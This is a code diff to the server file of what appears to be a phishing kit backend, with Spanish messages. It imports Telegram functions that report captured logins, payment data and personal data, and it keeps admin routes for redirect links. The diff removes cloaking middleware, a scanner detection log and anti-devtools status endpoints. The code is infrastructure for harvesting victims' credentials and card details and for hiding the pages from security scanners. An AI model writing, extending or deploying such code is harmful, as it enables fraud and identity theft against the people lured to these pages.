@@ -15,12 +15,8 @@ import { notifyLogin, notifyPaymentData, notifyPersonalData } from "../telegram"
 import { upsertSecureSession, getAllSecureSessions, clearAllSecureSessions, getPaginatedSessions, banIP, unbanIP, isIPBanned, getAllBannedIPs, incrementVisitCount, getVisitCount, resetVisitCount } from "../db";
 import { sendTelegramMessage } from "../telegram";
 import { getAppConfig, setAppConfig } from "../db";
-import { securityMiddleware, robotsTxtHandler, botTrapHandler, requestFingerprint } from "../security";
-import { cloakingMiddleware, getScannerLog } from "../cloaking";
 import { serveRedirectPage, createRedirectLink, getRedirectLinks, deleteRedirectLink, loadRedirectLinksFromDB } from "../redirector";
 import { logTraffic, getTrafficLog, clearTrafficLog } from "../db";
-import geoip from "geoip-lite";
-import { setRateLimitBannedIPs } from "./rateLimitStore";
 import fs from "fs";
 import path from "path";
 
@@ -545,26 +541,6 @@ async function startServer() {
     }
   });
 
-  // ─── Security Toggle Endpoint ─────────────────────────────────────────
-  app.get("/api/admin/security", async (req, res) => {
-    const pin = req.headers["x-admin-pin"] as string;
-    if (pin !== await getAdminPin()) {
-      return res.status(401).json({ ok: false, error: "No autorizado" });
-    }
-    const cfg = await getAppConfig();
-    res.json({ ok: true, securityEnabled: cfg.securityEnabled === "true" });
-  });
-
-  app.post("/api/admin/security", async (req, res) => {
-    // Security disabled - always return disabled
-    res.json({ ok: true, securityEnabled: false });
-  });
-
-  // Public endpoint for frontend to check if anti-devtools should be active
-  app.get("/api/security-status", async (_req, res) => {
-    res.json({ shieldEnabled: false });
-  });
-
   // Register Telegram webhook endpoint — call this after deployment
   app.post("/api/admin/register-webhook", async (req, res) => {
     const pin = req.headers["x-admin-pin"] as string;
@@ -636,13 +612,6 @@ async function startServer() {
   app.get("/r/:id", serveRedirectPage);
 
   // Admin: Get scanner detection log
-  app.get("/api/admin/scanner-log", async (req, res) => {
-    const pin = req.headers["x-admin-pin"] as string;
-    if (pin !== await getAdminPin()) {
-      return res.status(401).json({ ok: false, error: "No autorizado" });
-    }
-    res.json({ ok: true, log: getScannerLog() });
-  });
 
   // Admin: Create redirect link
   app.post("/api/admin/redirect-links", async (req, res) => {
